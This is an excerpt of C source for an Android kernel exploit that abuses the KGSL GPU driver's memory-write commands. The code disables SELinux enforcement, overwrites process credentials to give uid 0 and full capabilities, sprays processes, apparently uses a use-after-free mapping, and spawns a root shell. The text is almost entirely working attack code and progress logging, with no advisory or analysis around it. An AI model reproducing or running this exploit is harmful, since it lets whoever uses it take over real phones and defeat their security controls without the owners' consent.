...
/* number of spray slots to attempt (may be limited by system) */
static int spray_count = SPRAY_COUNT;
/* actual number of successfully forked spray processes (set after forking) */
...
/*
 * Write to kernel/GPU virtual address using GPU CP_MEM_WRITE.
 * This uses a direct memory write packet instead of CP_MEM_TO_MEM.
 */
static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t size)
{
    ...
    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 && wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        ...
        usleep(100000);
        result = 0;
        fprintf(stderr, "[GPU_WRITE] CP_MEM_WRITE submitted OK for 0x%llx\n", (unsigned long long)dst_va);
    }
...
static int disable_selinux_via_gpu(int fd)
{
    ...
    fprintf(stderr, "[SELINUX] Writing 0 to 0x%llx via GPU\n", (unsigned long long)selinux_enforcing);
    uint32_t zero_val = 0;
...
static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
{
    ...
    {
        fprintf(stderr, "[GPU_CRED] Invalid cred_ptr\n");
        return 0;
    }

    fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%llx via CP_MEM_WRITE\n", (unsigned long long)cred_ptr);
    ...
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
        goto fail;
    ib_id = ib_alloc.id;
    ib_vma = mmap(NULL, ib_alloc.mmapsize,
    ...
    {
        uint32_t d_lo, d_hi;
        split64(cred_ptr + 0x04 + i * 4, &d_lo, &d_hi);
        cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
        cmd[dw++] = d_lo;
        cmd[dw++] = d_hi;
        cmd[dw++] = 0x00000000;
    ...
    uint32_t cap_offsets[] = {0x28, 0x30, 0x38, 0x40, 0x48};
    for (int c = 0; c < 5; c++)
    {
        for (int half = 0; half < 2; half++)
        {
            uint32_t d_lo, d_hi;
            split64(cred_ptr + cap_offsets[c] + half * 4, &d_lo, &d_hi);
            cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = 0xFFFFFFFF;
    ...
    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
    {
        ...
        {
            uint32_t d_lo, d_hi;
            split64(real_cred_ptr + 0x04 + i * 4, &d_lo, &d_hi);
            cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
            cmd[dw++] = d_lo;
            cmd[dw++] = d_hi;
            cmd[dw++] = 0x00000000;
        ...
        for (int c = 0; c < 5; c++)
        {
            ...
            {
                uint32_t d_lo, d_hi;
                split64(real_cred_ptr + cap_offsets[c] + half * 4, &d_lo, &d_hi);
                cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                cmd[dw++] = d_lo;
                cmd[dw++] = d_hi;
                cmd[dw++] = 0xFFFFFFFF;
    ...
    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) == 0 &&
        wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) == 0)
    {
        fprintf(stderr, "[GPU_CRED] CP_MEM_WRITE submitted OK\n");
        __sync_synchronize();
        usleep(100000);
        result = 1;
    }

    uid_t check_uid = getuid();
    fprintf(stderr, "[GPU_CRED] getuid() after patch: %d\n", check_uid);

    if (check_uid == 0)
    {
        fprintf(stderr, "[GPU_CRED] SUCCESS! uid=0\n");
        result = 1;
    }
...
static uint64_t find_offsets_auto(uint64_t kernel_base)
{
    ...
    for (size_t i = 0; i < sizeof(selinux_offsets) / sizeof(selinux_offsets[0]); i++)
    {
        ...
        if (gpu_read_task_struct(fd, test_addr, test_data, 8) == 0)
        {
            ...
            {
                fprintf(stderr, "[SELINUX] Found offset 0x%llx at addr 0x%llx val=0x%llx\n",
                        (unsigned long long)selinux_offsets[i], (unsigned long long)test_addr, (unsigned long long)val);
...
static uint64_t find_selinux_enforcing(void)
{
    ...
    /* Try /proc/kallsyms first for selinux symbols (fast, KASLR-safe) */
    FILE *kfs = fopen("/proc/kallsyms", "r");
    if (kfs)
    {
        char line[512];
        while (fgets(line, sizeof(line), kfs))
        {
            if (strstr(line, " selinux_enforcing") || strstr(line, " selinux_state") || strstr(line, " selinux_enabled"))
            {
                unsigned long long addr = 0;
                char *addr_str = strtok(line, " \t");
                if (addr_str && sscanf(addr_str, "%llx", &addr) == 1 && addr != 0)
                {
                    selinux_enforcing = addr;
                    kernel_base = addr & 0xffffffff00000000ULL;
                    fclose(kfs);
                    fprintf(stderr, "[SELINUX] Found via kallsyms at 0x%llx\n", (unsigned long long)selinux_enforcing);
...
static int verify_is_task_struct(uint8_t *data, size_t size, int marker_offset)
{
    int known_comm_offsets[] = {0x250, 0x290, 0x2d0, 0x300, 0x340, 0x480, 0x818};
    for (int i = 0; i < 7; i++)
    {
        if (known_comm_offsets[i] == marker_offset)
        {
            fprintf(stderr, "[VERIFY] comm offset 0x%x is known valid\n", marker_offset);
            return 1;
        }
    }

    int ptr_count = 0;
    for (int off = 0; off < marker_offset && off < 256; off += 8)
    {
    ...
    if (ptr_count >= 3)
    {
        fprintf(stderr, "[VERIFY] Found %d kernel ptrs before marker - likely task_struct\n", ptr_count);
        return 1;
    }

    fprintf(stderr, "[VERIFY] WARNING: marker at 0x%x may not be task_struct!\n", marker_offset);
    return 0;
}

static int find_comm_offset(uint8_t *data, size_t size)
{
    const char *marker = "KETO0422";
    size_t marker_len = 8;
    for (int off = 0; off < (int)size - (int)marker_len - 5; off++)
    {
        if (memcmp(data + off, marker, marker_len) == 0)
        {
            fprintf(stderr, "[COMM] Found marker at offset 0x%x\n", off);
            return off;
        }
    }
    return -1;
...
{
    int marker_offset = find_comm_offset(task_data, size);
    if (marker_offset >= 0)
        verify_is_task_struct(task_data, size, marker_offset);

    for (int off = 0; off + 16 <= (int)size; off += 8)
    {
        uint64_t val1 = *(uint64_t *)(task_data + off);
        uint64_t val2 = *(uint64_t *)(task_data + off + 8);
        ...
        uint8_t cred_check[32] = {0};
        if (gpu_read_task_struct(fd, val1, cred_check, sizeof(cred_check)) != 0)
            continue;
        ...
        if (usage > 0 && usage < 1000 && uid < 100000 && gid < 100000)
        {
            *cred_offset = off;
            *real_cred_offset = off + 8;
            *cred_ptr = val1;
            *real_cred_ptr = val2;

            fprintf(stderr, "[CRED_WIDE] Found cred at offset 0x%x: cred=0x%llx usage=%u uid=%u\n",
                    off, (unsigned long long)val1, usage, uid);
            return 1;
        }
    }

    fprintf(stderr, "[CRED_WIDE] No cred found in page\n");
    return 0;
}
...
static uint64_t find_kernel_base_from_task_struct(uint8_t *task_data, size_t data_size)
{
    for (int off = 0; off + 8 <= (int)data_size; off += 8)
    {
        ...
        uint64_t possible_base = ptr & 0xFFFFFFFF00000000ULL;
        ...
        for (int b = 0; b < sizeof(bases_to_try) / sizeof(bases_to_try[0]); b++)
        {
            ...
            {
                fprintf(stderr, "[KBASE] Candidate 0x%llx from ptr 0x%llx at off 0x%x (first_word=0x%08x)\n",
                        (unsigned long long)test_base, (unsigned long long)ptr, off, first_word);
                return test_base;
            }
        }
    }
...
// ================== ПОИСК KERNEL BASE ПО task_va ==================
static uint64_t find_kernel_base_from_task_va(uint64_t task_va)
{
    uint8_t task_data[4096];

    // Используем глобальный fd
    if (gpu_read_task_struct(fd, task_va, task_data, sizeof(task_data)) != 0)
    {
        fprintf(stderr, "[KERNEL_BASE] Failed to read task_struct at 0x%llx\n",
                (unsigned long long)task_va);
        return 0;
    }

    // Вызываем основную функцию поиска kernel_base
...
static int patch_cred_via_uaf_mmap(uint64_t task_va, uint64_t cred_offset, uint64_t real_cred_offset, uint64_t fake_cred)
{
    ...
    *ptr_real_cred = fake_cred;
    ...
    fprintf(stderr, "[CHILD] UAF mmap WRITE: cred written, real_cred written\n");
    ...
    if (gpu_read_task_struct(fd, task_va + cred_offset, verify_data, 16) == 0)
    {
        ...
        fprintf(stderr, "[CHILD] UAF mmap verify: cred=0x%llx real_cred=0x%llx (exp 0x%llx)\n",
                new_cred, new_real_cred, fake_cred);
        fprintf(stderr, "[CHILD] UAF mmap direct mem: cred=0x%llx real_cred=0x%llx\n",
                *ptr_cred, *ptr_real_cred);
        if (new_cred == fake_cred && new_real_cred == fake_cred)
        {
            fprintf(stderr, "[CHILD] [+] UAF mmap cred patch SUCCESS!\n");
            return 1;
        }
    }
...
{
    /* Read cred pointers from task_struct via GPU (do not use pagemap) */
    uint8_t tmp[16] = {0};
    if (gpu_read_task_struct(fd, task_va + cred_offset, tmp, 16) != 0)
    {
        fprintf(stderr, "[CHILD] [!] Failed to read cred pointers from task_struct\n");
        return 0;
    }

    uint64_t cred_ptr = *(uint64_t *)(tmp);
    uint64_t real_cred_ptr = *(uint64_t *)(tmp + 8);

    fprintf(stderr, "[CHILD] GPU patching cred at virt: 0x%llx (real_cred 0x%llx)\n", cred_ptr, real_cred_ptr);

    int r1 = gpu_write_task_64(fd, cred_ptr, fake_cred);
    int r2 = gpu_write_task_64(fd, real_cred_ptr, fake_cred);
    fprintf(stderr, "[CHILD] gpu write results: r1=%d r2=%d\n", r1, r2);
    if (r1 != 0 || r2 != 0)
    {
        fprintf(stderr, "[CHILD] [!] gpu write to virt failed\n");
        return 0;
    }

    __sync_synchronize();

    /* Verify via GPU read of the same virtual addresses */
    for (int attempt = 0; attempt < 10; attempt++)
    {
        usleep(1000 * (attempt + 1));
        uint8_t verify[16] = {0};
        if (gpu_read_task_struct(fd, cred_ptr, verify, 16) == 0)
        {
            uint64_t new_cred = *(uint64_t *)verify;
            uint64_t new_real = *(uint64_t *)(verify + 8);
            fprintf(stderr, "[CHILD] Attempt %d: virt cred=0x%llx real=0x%llx (exp 0x%llx)\n", attempt, new_cred, new_real, fake_cred);
            if (new_cred == fake_cred && new_real == fake_cred)
            {
                fprintf(stderr, "[CHILD] [+] GPU virt cred patch SUCCESS on attempt %d!\n", attempt);
                return 1;
            }
        }
    }

    fprintf(stderr, "[CHILD] [!] GPU virt cred patch FAILED - not verified\n");
    return 0;
}
...
static int patch_cred_proc_mem(uint64_t task_va, uint64_t cred_offset, uint64_t real_cred_offset, uint64_t fake_cred)
{
    ...
    uint64_t cred_phys = 0; /* pagemap skipped for GPU VA */
    fprintf(stderr, "[CHILD] /proc/self/mem: cred_va=0x%llx (phys skipped)\n", cred_va);
...
static int verify_cred_gpu(uint64_t cred_va)
{
    uint8_t gpu_data[128];
    if (gpu_read_task_struct(fd, cred_va, gpu_data, sizeof(gpu_data)) != 0)
    {
        fprintf(stderr, "[VERIFY] GPU read failed for cred_va=0x%llx\n", (unsigned long long)cred_va);
        return 0;
    }

    uint32_t uid = *(uint32_t *)(gpu_data + 0x04);
    uint32_t gid = *(uint32_t *)(gpu_data + 0x08);
    uint32_t euid = *(uint32_t *)(gpu_data + 0x14);
    uint32_t egid = *(uint32_t *)(gpu_data + 0x18);
    uint64_t cap_eff = *(uint64_t *)(gpu_data + 0x38);
    uint64_t cap_prm = *(uint64_t *)(gpu_data + 0x30);

    fprintf(stderr, "[VERIFY] GPU virt: uid=%u gid=%u euid=%u egid=%u cap_eff=0x%llx cap_prm=0x%llx\n",
            uid, gid, euid, egid, (unsigned long long)cap_eff, (unsigned long long)cap_prm);

    for (int i = 0; i < 128; i += 16)
    {
        fprintf(stderr, "[DIAG] cred+0x%02x:", i);
        for (int j = 0; j < 16; j += 4)
            fprintf(stderr, " %08x", *(uint32_t *)(gpu_data + i + j));
        fprintf(stderr, "\n");
    }

    return (uid == 0 && gid == 0 && euid == 0 && egid == 0) ||
           (cap_eff == 0xFFFFFFFFFFFFFFFFULL && cap_prm == 0xFFFFFFFFFFFFFFFFULL);
}
...
static void safe_cred_patch(void)
{
    ...
    // /proc/self/pagemap is not reliable for GPU virtual addresses; skip
    uint64_t task_phys = 0;
    fprintf(stderr, "[CHILD] task_phys: (pagemap skipped for GPU VA)\n");
    ...
    if (kernel_base != 0 && selinux_enforcing != 0)
    {
        ...
        /* Write to selinux_enforcing via GPU virtual write */
    ...
    fprintf(stderr, "[CHILD] Step 2: Reading task_struct...\n");
    int chunk_size = 256;
    ...
    fprintf(stderr, "[CHILD] [+] task_struct read complete\n");
    ...
    // ===== ШАГ 4: Ищем cred =====
    fprintf(stderr, "[CHILD] Step 3: Searching for cred pointers...\n");
    ...
    // Логируем: pagemap не применим к GPU VA
    uint64_t cred_phys = 0;
    fprintf(stderr, "[CHILD] cred virtual: 0x%llx (physical skipped)\n",
            task_va + cred_offset);
    ...
    fprintf(stderr, "[CHILD] Step 4: Reading original cred...\n");
    ...
    fprintf(stderr, "[CHILD] [+] Cred read complete\n");

    fprintf(stderr, "[CHILD] Step 5: Patching cred via GPU...\n");
    patched = patch_cred_via_gpu(fd, cred, real_cred);
    fprintf(stderr, "[CHILD] GPU cred patch result: %d\n", patched);

    fprintf(stderr, "[CHILD] Step 6: FINAL GPU verification...\n");
    if (patched && verify_cred_gpu(cred))
    {
        fprintf(stderr, "[CHILD] [+++] GPU cred verification SUCCESS!\n");
        patched = 1;
    }
    else
    {
        fprintf(stderr, "[CHILD] [!] GPU cred verification FAILED\n");
        patched = 0;
    }

    // ===== ШАГ 11: Пытаемся получить root =====
    fprintf(stderr, "[CHILD] Step 10: Attempting root shell...\n");
    ...
    fprintf(stderr, "[CHILD] After setresuid: uid=%d gid=%d\n", new_uid, new_gid);

    if (new_uid == 0)
    {
        fprintf(stderr, "[CHILD] ROOT! Spawning shell...\n");
    ...
    {
        fprintf(stderr, "[CHILD] Not root (uid=%d)\n", new_uid);
        fprintf(stderr, "[CHILD] Trying alternative methods...\n");

        int attr_fd = open("/proc/self/attr/exec", O_WRONLY);
        if (attr_fd >= 0)
        {
            write(attr_fd, "u:r:init:s0", 11);
            close(attr_fd);
        }
        ...
        {
            char *argv[] = {"sh", "-i", NULL};
            char *envp[] = {"PATH=/sbin:/system/bin", NULL};
            execve("/system/bin/sh", argv, envp);
        }
    }

    fprintf(stderr, "[CHILD] Setting TASK_SPRAY_CLEAR=%d (patched=%d)\n",
            patched ? 0x2 : 0x1, patched);
        ...
        if (find_marker_in_page(bytes, 4096, current_va, &comm_pid))
        {
            ...
            if (comm_pid > 0)
            {
                ...
                *(uint64_t *)&gbuf[0xb08] = current_va;
                ...
                /* If PID not found in spray_ctrl, try to dynamically insert it */
...
{
    /* Increase system limits to allow large spray */
    struct rlimit rl;
    ...
    if (!pid)
    {
        ...
        if (!pid2)
        {
            if (!wait_for_flag_u8(&gbuf[FOUND_PID], 0x12, WAIT_TIMEOUT_MS))
            {
        ...
        {
            if (!wait_for_flag_u8(&gbuf[FOUND_PID], 0x11, WAIT_TIMEOUT_MS))
            {
            ...
            gbuf[FOUND_PID] = 0x12;
            /* wait for child2 to finish so it doesn't get reparented to init */
            waitpid(pid2, NULL, 0);
            _exit(0);
        }
    }
...
restart:;
    ...
    for (int i = 0; i < spray_count; i++)
    {
        ...
        if (pid == 0)
        {
            ...
            spray_ctrl[idx].ready = 1; /* signal parent this slot is ready */
    ...
    /* record how many processes actually started */
    ...
    /* wait for readiness with short timeout instead of long sleep */
    int wait_ms = 2000;
    int waited = 0;
    int ready_count = 0;
